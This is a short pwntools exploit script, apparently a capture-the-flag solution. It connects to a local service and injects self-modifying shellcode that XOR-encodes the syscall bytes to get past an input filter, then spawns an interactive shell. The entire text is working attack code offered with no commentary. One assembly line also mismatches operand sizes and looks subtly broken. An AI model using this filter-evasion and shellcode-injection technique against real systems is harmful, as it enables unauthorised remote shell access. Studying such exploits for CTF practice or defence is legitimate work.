from pwn import *
context.log_level='debug'
context.arch='amd64'
context.os='linux'

p=remote('127.0.0.1',9998)
payload=asm(
        '''
        mov rdi, 0xdead0041
        xor eax, eax
        mov eax, word [rdi]
        xor eax, 0x1
        mov word [rdi], eax
        ''')
shellcode=asm(shellcraft.sh())[:-2]
shellcode+=(0x50f^1).to_bytes(2,'little')
payload+=shellcode
p.sendafter(b'Input your shellcode: ',payload)
p.interactive()
